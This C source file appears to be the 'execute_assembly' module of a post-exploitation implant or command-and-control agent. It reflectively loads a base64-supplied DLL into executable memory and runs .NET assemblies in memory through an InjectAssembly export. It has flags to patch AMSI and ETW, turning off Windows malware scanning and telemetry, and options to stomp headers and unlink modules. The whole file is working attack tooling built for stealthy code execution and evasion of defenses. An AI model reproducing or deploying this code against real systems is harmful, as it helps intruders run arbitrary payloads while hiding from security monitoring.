#include "helpers.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//----------------[config]--------------------------------------------------//

#define MAX_CLIARG_COUNT 50
#define MAX_ARG_LENGTH 150
#define FLAGS_COUNT 4

#define DEREF( name )*(UINT_PTR *)(name)
#define DEREF_64( name )*(DWORD64 *)(name)
#define DEREF_32( name )*(DWORD *)(name)
#define DEREF_16( name )*(WORD *)(name)
#define DEREF_8( name )*(BYTE *)(name)

//----------------[types]---------------------------------------------------//

typedef ULONG_PTR (WINAPI * REFLECTIVELOADER)(LPVOID lpParameter);
typedef int (*InjectAssemblyFunc)(LPSTR assemblyBytes, ULONG assemblyLength, LPSTR* arguments,
    size_t argsCount, const wchar_t* unlinkmodules, const wchar_t* stompheaders,
    const wchar_t* amsi, const wchar_t* etw);
typedef int (*DecompressFunc)(LPSTR dst, ULONG* dst_length, LPSTR src, ULONG src_length);

typedef struct {
    wchar_t amsi[16];
    wchar_t etw[16];
    wchar_t stompheaders[16];
    wchar_t unlinkmodules[16];
} AssemblyFlags;

//----------------[cached module state]-------------------------------------//

static LPVOID g_cachedModule = NULL;
static InjectAssemblyFunc g_cachedInjectAssembly = NULL;
static DecompressFunc g_cachedDecompress = NULL;

//----------------[output buffer]-------------------------------------------//

static char* g_assemblyOutput = NULL;
static size_t g_assemblyOutputSize = 0;
static size_t g_assemblyOutputCapacity = 0;
static CRITICAL_SECTION g_outputLock;
static BOOL g_outputLockInitialized = FALSE;

//----------------[pipe reader thread context]------------------------------//

typedef struct {
    HANDLE hReadPipe;
    volatile BOOL* pStopReading;
} PipeReaderContext;

static void appendOutputThreadSafe(const char* message) {
    if (message == NULL) return;
    
    if (g_outputLockInitialized) {
        EnterCriticalSection(&g_outputLock);
    }
    
    size_t msgLen = strlen(message);
    size_t needed = g_assemblyOutputSize + msgLen + 2;
    
    if (needed > g_assemblyOutputCapacity) {
        size_t newCapacity = (needed + 4095) & ~4095;
        char* newBuffer = (char*)realloc(g_assemblyOutput, newCapacity);
        if (newBuffer == NULL) {
            if (g_outputLockInitialized) {
                LeaveCriticalSection(&g_outputLock);
            }
            return;
        }
        g_assemblyOutput = newBuffer;
        g_assemblyOutputCapacity = newCapacity;
    }
    
    if (g_assemblyOutputSize == 0) {
        strcpy_s(g_assemblyOutput, g_assemblyOutputCapacity, message);
        strcat_s(g_assemblyOutput, g_assemblyOutputCapacity, "\n");
    } else {
        strcat_s(g_assemblyOutput, g_assemblyOutputCapacity, message);
        strcat_s(g_assemblyOutput, g_assemblyOutputCapacity, "\n");
    }
    
    g_assemblyOutputSize = strlen(g_assemblyOutput);
    
    if (g_outputLockInitialized) {
        LeaveCriticalSection(&g_outputLock);
    }
}

static void appendOutput(const char* message) {
    if (message == NULL) return;
    
    // Always print to console for debugging
    printf("[execute_assembly] %s\n", message);
    fflush(stdout);
    
    appendOutputThreadSafe(message);
}

static void appendRawOutput(const char* data, size_t len) {
    if (data == NULL || len == 0) return;
    
    if (g_outputLockInitialized) {
        EnterCriticalSection(&g_outputLock);
    }
    
    size_t needed = g_assemblyOutputSize + len + 1;
    
    if (needed > g_assemblyOutputCapacity) {
        size_t newCapacity = (needed + 4095) & ~4095;
        char* newBuffer = (char*)realloc(g_assemblyOutput, newCapacity);
        if (newBuffer == NULL) {
            if (g_outputLockInitialized) {
                LeaveCriticalSection(&g_outputLock);
            }
            return;
        }
        g_assemblyOutput = newBuffer;
        g_assemblyOutputCapacity = newCapacity;
    }
    
    memcpy(g_assemblyOutput + g_assemblyOutputSize, data, len);
    g_assemblyOutputSize += len;
    g_assemblyOutput[g_assemblyOutputSize] = '\0';
    
    if (g_outputLockInitialized) {
        LeaveCriticalSection(&g_outputLock);
    }
}

//----------------[pipe reader thread]--------------------------------------//

static DWORD WINAPI pipeReaderThread(LPVOID lpParam) {
    PipeReaderContext* ctx = (PipeReaderContext*)lpParam;
    char readBuf[4096];
    DWORD bytesRead;
    DWORD bytesAvailable;
    
    while (!(*ctx->pStopReading)) {
        // Check if there's data available
        if (PeekNamedPipe(ctx->hReadPipe, NULL, 0, NULL, &bytesAvailable, NULL)) {
            if (bytesAvailable > 0) {
                DWORD toRead = (bytesAvailable < sizeof(readBuf) - 1) ? bytesAvailable : sizeof(readBuf) - 1;
                if (ReadFile(ctx->hReadPipe, readBuf, toRead, &bytesRead, NULL) && bytesRead > 0) {
                    readBuf[bytesRead] = '\0';
                    // Also print to actual console for debugging
                    printf("%.*s", (int)bytesRead, readBuf);
                    fflush(stdout);
                    // Append to our output buffer
                    appendRawOutput(readBuf, bytesRead);
                }
            } else {
                // No data available, sleep briefly to avoid busy-waiting
                Sleep(10);
            }
        } else {
            // Pipe error or closed
            break;
        }
    }
    
    // Drain any remaining data after stop signal
    while (PeekNamedPipe(ctx->hReadPipe, NULL, 0, NULL, &bytesAvailable, NULL) && bytesAvailable > 0) {
        DWORD toRead = (bytesAvailable < sizeof(readBuf) - 1) ? bytesAvailable : sizeof(readBuf) - 1;
        if (ReadFile(ctx->hReadPipe, readBuf, toRead, &bytesRead, NULL) && bytesRead > 0) {
            readBuf[bytesRead] = '\0';
            printf("%.*s", (int)bytesRead, readBuf);
            fflush(stdout);
            appendRawOutput(readBuf, bytesRead);
        } else {
            break;
        }
    }
    
    return 0;
}

//----------------[base64]--------------------------------------------------//

static const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static int b64invs[] = { 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58,
    59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5,
    6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
    21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28,
    29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42,
    43, 44, 45, 46, 47, 48, 49, 50, 51 };

static ULONG b64DecodeSize(LPCSTR in) {
    ULONG len;
    ULONG ret;
    ULONG i;
    
    if (in == NULL) return 0;
    
    len = (ULONG)strlen(in);
    ret = len / 4 * 3;
    
    for (i = len; i-- > 0; ) {
        if (in[i] == '=') {
            ret--;
        } else {
            break;
        }
    }
    
    return ret;
}

static int isValidb64Char(BYTE c) {
    if (c >= '0' && c <= '9') return 1;
    if (c >= 'A' && c <= 'Z') return 1;
    if (c >= 'a' && c <= 'z') return 1;
    if (c == '+' || c == '/' || c == '=') return 1;
    return 0;
}

static int b64Decode(LPCSTR in, LPSTR bytes, size_t bytesLen) {
    size_t len;
    size_t i;
    size_t j;
    int v;
    
    if (in == NULL || bytes == NULL) return 0;
    
    len = strlen(in);
    if (bytesLen < b64DecodeSize(in) || len % 4 != 0) return 0;
    
    for (i = 0; i < len; i++) {
        if (!isValidb64Char(in[i])) {
            return 0;
        }
    }
    
    for (i = 0, j = 0; i < len; i += 4, j += 3) {
        v = b64invs[in[i] - 43];
        v = (v << 6) | b64invs[in[i + 1] - 43];
        v = in[i + 2] == '=' ? v << 6 : (v << 6) | b64invs[in[i + 2] - 43];
        v = in[i + 3] == '=' ? v << 6 : (v << 6) | b64invs[in[i + 3] - 43];
        
        bytes[j] = (v >> 16) & 0xFF;
        if (in[i + 2] != '=')
            bytes[j + 1] = (v >> 8) & 0xFF;
        if (in[i + 3] != '=')
            bytes[j + 2] = v & 0xFF;
    }
    
    return 1;
}

//----------------[arg parsing]---------------------------------------------//

static LPSTR strmbtok_local(LPSTR input, LPSTR delimit, LPSTR openblock, LPSTR closeblock) {
    static char* token = NULL;
    char* lead = NULL;
    char* block = NULL;
    int iBlock = 0;
    int iBlockIndex = 0;
    
    if (input != NULL) {
        token = input;
        lead = input;
    } else {
        lead = token;
        if (token == NULL || *token == '\0') {
            lead = NULL;
            return lead;
        }
    }
    
    while (*token != '\0') {
        if (iBlock) {
            if (closeblock[iBlockIndex] == *token) {
                iBlock = 0;
            }
            token++;
            continue;
        }
        if ((block = strchr(openblock, *token)) != NULL) {
            iBlock = 1;
            iBlockIndex = (int)(block - openblock);
            token++;
            continue;
        }
        if (strchr(delimit, *token) != NULL) {
            *token = '\0';
            token++;
            break;
        }
        token++;
    }
    return lead;
}

static void removeChar(LPSTR str, BYTE toRemove) {
    char* src, * dst;
    for (src = dst = str; *src != '\0'; src++) {
        *dst = *src;
        if (*dst != toRemove) dst++;
    }
    *dst = '\0';
}

static LPSTR* getAssemblyArgs(const char* argsString, DWORD* count) {
    if (argsString == NULL || strlen(argsString) == 0) {
        *count = 0;
        return NULL;
    }
    
    appendOutput("[+]: Parsing Arguments");
    
    LPSTR* args = (LPSTR*)safe_malloc(MAX_CLIARG_COUNT * sizeof(LPSTR));
    if (args == NULL) return NULL;
    
    for (int c = 0; c < MAX_CLIARG_COUNT; c++) {
        args[c] = (LPSTR)safe_malloc(MAX_ARG_LENGTH * sizeof(BYTE));
        if (args[c] != NULL) {
            memset(args[c], 0, MAX_ARG_LENGTH);
        }
    }
    
    char openChr[] = "\"'";
    char closeChr[] = "\"'}";
    
    char* argsStr = _strdup(argsString);
    if (argsStr == NULL) {
        return args;
    }
    
    LPSTR arg = strmbtok_local(argsStr, " ", openChr, closeChr);
    if (arg != NULL && strlen(arg) > 0) {
        strcpy_s(args[*count], MAX_ARG_LENGTH, arg);
        (*count)++;
        
        while ((arg = strmbtok_local(NULL, " ", openChr, closeChr)) != NULL && *count < MAX_CLIARG_COUNT) {
            if (strlen(arg) > 0) {
                strcpy_s(args[*count], MAX_ARG_LENGTH, arg);
                (*count)++;
            }
        }
    }
    
    free(argsStr);
    
    for (DWORD i = 0; i < *count; i++) {
        removeChar(args[i], '\"');
    }
    
    char debugMsg[128];
    if (*count > 0) {
        snprintf(debugMsg, sizeof(debugMsg), "\t[i]: Args count: %lu", *count);
    } else {
        snprintf(debugMsg, sizeof(debugMsg), "\t[i]: No Args.");
    }
    appendOutput(debugMsg);
    
    return args;
}

//----------------[reflective loading]--------------------------------------//

static DWORD rvaToFileOffset(PIMAGE_NT_HEADERS pNtHeaders, DWORD rva) {
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (rva >= pSectionHeader[i].VirtualAddress &&
            rva < pSectionHeader[i].VirtualAddress + pSectionHeader[i].SizeOfRawData) {
            return rva - pSectionHeader[i].VirtualAddress + pSectionHeader[i].PointerToRawData;
        }
    }
    
    return rva;
}

static DWORD getReflectiveLoaderOffset(LPVOID lpReflectiveDllBuffer) {
    UINT_PTR uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;
    UINT_PTR uiExportDir = 0;
    UINT_PTR uiNameArray = 0;
    UINT_PTR uiAddressArray = 0;
    UINT_PTR uiNameOrdinals = 0;
    DWORD dwCounter = 0;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)uiBaseAddress;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return 0;
    }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return 0;
    }

    DWORD exportDirRva = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD exportDirOffset = rvaToFileOffset(pNtHeaders, exportDirRva);
    
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(uiBaseAddress + exportDirOffset);
    
    DWORD nameArrayOffset = rvaToFileOffset(pNtHeaders, pExportDir->AddressOfNames);
    DWORD addressArrayOffset = rvaToFileOffset(pNtHeaders, pExportDir->AddressOfFunctions);
    DWORD ordinalsArrayOffset = rvaToFileOffset(pNtHeaders, pExportDir->AddressOfNameOrdinals);
    
    uiNameArray = uiBaseAddress + nameArrayOffset;
    uiAddressArray = uiBaseAddress + addressArrayOffset;
    uiNameOrdinals = uiBaseAddress + ordinalsArrayOffset;

    dwCounter = pExportDir->NumberOfNames;
    for (DWORD i = 0; i < dwCounter; i++) {
        DWORD nameRva = DEREF_32(uiNameArray + (i * sizeof(DWORD)));
        DWORD nameOffset = rvaToFileOffset(pNtHeaders, nameRva);
        char* cpExportedFunctionName = (char*)(uiBaseAddress + nameOffset);
        
        if (strstr(cpExportedFunctionName, "ReflectiveLoader") != NULL) {
            WORD ordinal = DEREF_16(uiNameOrdinals + (i * sizeof(WORD)));
            DWORD functionRva = DEREF_32(uiAddressArray + (ordinal * sizeof(DWORD)));
            DWORD functionOffset = rvaToFileOffset(pNtHeaders, functionRva);
            return functionOffset;
        }
    }
    
    return 0;
}

static LPVOID reflectivelyLoadDll(LPVOID dllBytes, DWORD dllSize, LPVOID lpParameter) {
    DWORD dwReflectiveLoaderOffset = getReflectiveLoaderOffset(dllBytes);
    if (dwReflectiveLoaderOffset == 0) {
        appendOutput("[!]: Could not find ReflectiveLoader export");
        return NULL;
    }
    
    LPVOID lpRemoteBuffer = VirtualAlloc(NULL, dllSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (lpRemoteBuffer == NULL) {
        appendOutput("[!]: VirtualAlloc failed");
        return NULL;
    }
    
    memcpy(lpRemoteBuffer, dllBytes, dllSize);
    FlushInstructionCache(GetCurrentProcess(), lpRemoteBuffer, dllSize);
    
    REFLECTIVELOADER pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpRemoteBuffer + dwReflectiveLoaderOffset);
    
    ULONG_PTR uiBaseAddress = pReflectiveLoader(lpParameter);
    
    if (uiBaseAddress == 0) {
        appendOutput("[!]: ReflectiveLoader returned NULL");
        VirtualFree(lpRemoteBuffer, 0, MEM_RELEASE);
        return NULL;
    }
    
    return (LPVOID)uiBaseAddress;
}

static FARPROC getExportedFunction(LPVOID moduleBase, const char* functionName) {
    UINT_PTR uiBaseAddress = (UINT_PTR)moduleBase;
    
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)uiBaseAddress;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    DWORD exportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportDirRVA == 0) {
        return NULL;
    }

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(uiBaseAddress + exportDirRVA);
    
    DWORD* pNameArray = (DWORD*)(uiBaseAddress + pExportDir->AddressOfNames);
    WORD* pOrdinalArray = (WORD*)(uiBaseAddress + pExportDir->AddressOfNameOrdinals);
    DWORD* pFunctionArray = (DWORD*)(uiBaseAddress + pExportDir->AddressOfFunctions);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        char* exportName = (char*)(uiBaseAddress + pNameArray[i]);
        if (strcmp(exportName, functionName) == 0) {
            WORD ordinal = pOrdinalArray[i];
            FARPROC func = (FARPROC)(uiBaseAddress + pFunctionArray[ordinal]);
            return func;
        }
    }
    
    return NULL;
}

//----------------[execute assembly]----------------------------------------//

char* execute_assembly_module(const char* params) {
    // Initialize output lock if needed
    if (!g_outputLockInitialized) {
        InitializeCriticalSection(&g_outputLock);
        g_outputLockInitialized = TRUE;
    }
    
    g_assemblyOutput = NULL;
    g_assemblyOutputSize = 0;
    g_assemblyOutputCapacity = 0;
    
    appendOutput("[*]: execute_assembly module started (reflective mode)");
    
    if (params == NULL || strlen(params) == 0) {
        appendOutput("[!]: No parameters provided to execute_assembly");
        return g_assemblyOutput;
    }
    
    char* paramsCopy = _strdup(params);
    if (paramsCopy == NULL) {
        appendOutput("[!]: Memory allocation failed");
        return g_assemblyOutput;
    }
    
    char* dllB64 = NULL;
    char* dllLenStr = NULL;
    char* assemblyB64 = NULL;
    char* assemblyLenStr = NULL;
    char* flagsStr = NULL;
    char* argsStr = NULL;
    
    char* context = NULL;
    char* token = strtok_s(paramsCopy, "|", &context);
    
    int fieldIndex = 0;
    while (token != NULL) {
        switch (fieldIndex) {
            case 0: dllLenStr = token; break;
            case 1: dllB64 = token; break;
            case 2: assemblyLenStr = token; break;
            case 3: assemblyB64 = token; break;
            case 4: flagsStr = token; break;
            case 5: argsStr = token; break;
        }
        fieldIndex++;
        token = strtok_s(NULL, "|", &context);
    }
    
    // Check if we already have the module loaded
    BOOL firstRun = (g_cachedModule == NULL);
    
    if (firstRun) {
        // First run: need DLL data
        if (dllB64 == NULL || assemblyB64 == NULL) {
            appendOutput("[!]: Invalid parameters - missing DLL or assembly data");
            free(paramsCopy);
            return g_assemblyOutput;
        }
    } else {
        // Subsequent runs: only need assembly data
        if (assemblyB64 == NULL) {
            appendOutput("[!]: Invalid parameters - missing assembly data");
            free(paramsCopy);
            return g_assemblyOutput;
        }
        appendOutput("[+]: Using cached ExecuteAssembly DLL (CLR already initialized)");
    }
    
    size_t dllOriginalSize = dllLenStr ? (size_t)atoi(dllLenStr) : 0;
    size_t assemblyDecompressedLen = assemblyLenStr ? (size_t)atoi(assemblyLenStr) : 0;
    
    char debugMsg[256];
    snprintf(debugMsg, sizeof(debugMsg), "[i]: DLL original size: %zu, Assembly decompressed size: %zu", 
        dllOriginalSize, assemblyDecompressedLen);
    appendOutput(debugMsg);
    
    // Only process flags on first run (CLR patching only works once)
    AssemblyFlags flags = { 0 };
    wcscpy_s(flags.amsi, 16, L"0");
    wcscpy_s(flags.etw, 16, L"0");
    wcscpy_s(flags.stompheaders, 16, L"0");
    wcscpy_s(flags.unlinkmodules, 16, L"0");
    
    if (firstRun && flagsStr != NULL && strlen(flagsStr) >= 4) {
        if (flagsStr[0] == '1') wcscpy_s(flags.amsi, 16, L"1");
        if (flagsStr[1] == '1') wcscpy_s(flags.etw, 16, L"1");
    }
    
    if (firstRun) {
        snprintf(debugMsg, sizeof(debugMsg), "[i]: Flags - AMSI:%ls ETW:%ls StompHeaders:%ls UnlinkModules:%ls",
            flags.amsi, flags.etw, flags.stompheaders, flags.unlinkmodules);
    } else {
        snprintf(debugMsg, sizeof(debugMsg), "[i]: Flags ignored on subsequent runs (CLR already patched)");
    }
    appendOutput(debugMsg);
    
    LPSTR dllBytes = NULL;
    DWORD dllFinalSize = 0;
    
    // Only decode and load DLL on first run
    if (firstRun) {
        appendOutput("[+]: Decoding ExecuteAssembly DLL...");
        size_t dllBytesLen = b64DecodeSize(dllB64) + 1;
        
        snprintf(debugMsg, sizeof(debugMsg), "[i]: Calculated dllBytesLen: %zu bytes", dllBytesLen);
        appendOutput(debugMsg);
        
        if (dllBytesLen > 10000000) {  // 10MB sanity check
            appendOutput("[!]: DLL decode size too large - possible parsing error");
            free(paramsCopy);
            return g_assemblyOutput;
        }
        
        dllBytes = (LPSTR)safe_malloc(dllBytesLen);
        if (dllBytes == NULL) {
            appendOutput("[!]: Memory allocation failed for DLL bytes");
            free(paramsCopy);
            return g_assemblyOutput;
        }
        
        if (!b64Decode(dllB64, dllBytes, dllBytesLen)) {
            appendOutput("[!]: Base64 decoding failed for DLL");
            safe_free(dllBytes);
            free(paramsCopy);
            return g_assemblyOutput;
        }
        
        dllFinalSize = (DWORD)(dllOriginalSize > 0 ? dllOriginalSize : (dllBytesLen - 1));
        snprintf(debugMsg, sizeof(debugMsg), "[+]: DLL decoded, size: %lu bytes", dllFinalSize);
        appendOutput(debugMsg);
    }
    
    appendOutput("[+]: Decoding .NET Assembly...");
    size_t assemblyBytesLen = b64DecodeSize(assemblyB64) + 1;
    LPSTR assemblyBytes = (LPSTR)safe_malloc(assemblyBytesLen);
    if (assemblyBytes == NULL) {
        appendOutput("[!]: Memory allocation failed for assembly bytes");
        if (dllBytes) safe_free(dllBytes);
        free(paramsCopy);
        return g_assemblyOutput;
    }
    
    if (!b64Decode(assemblyB64, assemblyBytes, assemblyBytesLen)) {
        appendOutput("[!]: Base64 decoding failed for assembly");
        safe_free(assemblyBytes);
        if (dllBytes) safe_free(dllBytes);
        free(paramsCopy);
        return g_assemblyOutput;
    }
    
    snprintf(debugMsg, sizeof(debugMsg), "[+]: Assembly decoded (compressed), size: %zu bytes", assemblyBytesLen - 1);
    appendOutput(debugMsg);
    
    DWORD count = 0;
    LPSTR* args = getAssemblyArgs(argsStr, &count);
    
    // Only reflectively load DLL on first run
    if (firstRun) {
        appendOutput("[+]: Reflectively loading ExecuteAssembly DLL...");
        
        g_cachedModule = reflectivelyLoadDll(dllBytes, dllFinalSize, NULL);
        if (g_cachedModule == NULL) {
            appendOutput("[!]: Failed to reflectively load DLL");
            goto cleanup;
        }
        
        g_cachedInjectAssembly = (InjectAssemblyFunc)getExportedFunction(g_cachedModule, "InjectAssembly");
        if (g_cachedInjectAssembly == NULL) {
            appendOutput("[!]: Failed to find InjectAssembly export");
            g_cachedModule = NULL;
            goto cleanup;
        }
        
        g_cachedDecompress = (DecompressFunc)getExportedFunction(g_cachedModule, "decompress");
        
        appendOutput("[+]: Found InjectAssembly function, caching for future use");
    }
    
    // Verify we have the cached function
    if (g_cachedInjectAssembly == NULL) {
        appendOutput("[!]: No cached InjectAssembly function available");
        goto cleanup;
    }
    
    LPSTR assemblyFinal = assemblyBytes;
    ULONG assemblyFinalLen = (ULONG)(assemblyBytesLen - 1);
    
    if (assemblyDecompressedLen > 0 && assemblyDecompressedLen > (assemblyBytesLen - 1)) {
        if (g_cachedDecompress != NULL) {
            appendOutput("[+]: Decompressing .NET Assembly...");
            LPSTR decompressedAssembly = (LPSTR)safe_malloc(assemblyDecompressedLen);
            if (decompressedAssembly != NULL) {
                ULONG decompLen = (ULONG)assemblyDecompressedLen;
                int res = g_cachedDecompress(decompressedAssembly, &decompLen, assemblyBytes, (ULONG)(assemblyBytesLen - 1));
                if (res == 0) {
                    assemblyFinal = decompressedAssembly;
                    assemblyFinalLen = decompLen;
                    snprintf(debugMsg, sizeof(debugMsg), "[+]: Decompression successful, final size: %lu bytes", decompLen);
                    appendOutput(debugMsg);
                } else {
                    snprintf(debugMsg, sizeof(debugMsg), "[-]: Decompression failed (error %d), using raw data", res);
                    appendOutput(debugMsg);
                    safe_free(decompressedAssembly);
                }
            }
        } else {
            appendOutput("[*]: No decompress function available, using raw data");
        }
    }
    
    snprintf(debugMsg, sizeof(debugMsg), "[*]: Executing assembly (%lu bytes) with %lu args", 
        assemblyFinalLen, count);
    appendOutput(debugMsg);
    
    // Create pipe to capture .NET assembly stdout output
    HANDLE hReadPipe = NULL, hWritePipe = NULL;
    HANDLE hOldStdout = NULL;
    HANDLE hReaderThread = NULL;
    volatile BOOL stopReading = FALSE;
    PipeReaderContext readerCtx = { 0 };
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    
    // Create pipe with larger buffer to reduce blocking
    if (CreatePipe(&hReadPipe, &hWritePipe, &sa, 65536)) {
        // Make the read handle non-inheritable
        SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
        
        // Save old stdout handle
        hOldStdout = GetStdHandle(STD_OUTPUT_HANDLE);
        
        // Start pipe reader thread BEFORE redirecting stdout
        readerCtx.hReadPipe = hReadPipe;
        readerCtx.pStopReading = &stopReading;
        hReaderThread = CreateThread(NULL, 0, pipeReaderThread, &readerCtx, 0, NULL);
        
        // Redirect Windows stdout handle to our pipe
        SetStdHandle(STD_OUTPUT_HANDLE, hWritePipe);
        
        // Call InjectAssembly - Console.WriteLine goes to our pipe via STD_OUTPUT_HANDLE
        // The reader thread drains the pipe concurrently to prevent blocking
        int result = g_cachedInjectAssembly(assemblyFinal, assemblyFinalLen, args, count,
            flags.unlinkmodules, flags.stompheaders, flags.amsi, flags.etw);
        
        // Restore stdout immediately
        SetStdHandle(STD_OUTPUT_HANDLE, hOldStdout);
        
        // Close write end so reader thread can finish draining
        CloseHandle(hWritePipe);
        hWritePipe = NULL;
        
        // Signal reader thread to stop and wait for it
        stopReading = TRUE;
        if (hReaderThread != NULL) {
            WaitForSingleObject(hReaderThread, 5000); // Wait up to 5 seconds
            CloseHandle(hReaderThread);
        }
        
        CloseHandle(hReadPipe);
        
        if (result == 1) {
            appendOutput("[*]: Assembly Execution Finished.");
        } else {
            appendOutput("[!]: Something went wrong during assembly execution.");
        }
    } else {
        // Fallback if pipe creation fails - just call without capture
        appendOutput("[!]: Warning: Could not create output pipe, assembly output may not be captured");
        int result = g_cachedInjectAssembly(assemblyFinal, assemblyFinalLen, args, count,
            flags.unlinkmodules, flags.stompheaders, flags.amsi, flags.etw);
        
        if (result == 1) {
            appendOutput("[*]: Assembly Execution Finished.");
        } else {
            appendOutput("[!]: Something went wrong during assembly execution.");
        }
    }
    
    if (assemblyFinal != assemblyBytes) {
        safe_free(assemblyFinal);
    }
    
cleanup:
    if (args != NULL) {
        for (DWORD c = 0; c < MAX_CLIARG_COUNT; c++) {
            if (args[c] != NULL) {
                safe_free(args[c]);
            }
        }
        safe_free(args);
    }
    
    if (assemblyBytes != NULL) {
        safe_free(assemblyBytes);
    }
    
    if (dllBytes != NULL) {
        safe_free(dllBytes);
    }
    
    free(paramsCopy);
    
    appendOutput("[*]: execute_assembly module completed");
    
    return g_assemblyOutput;
}
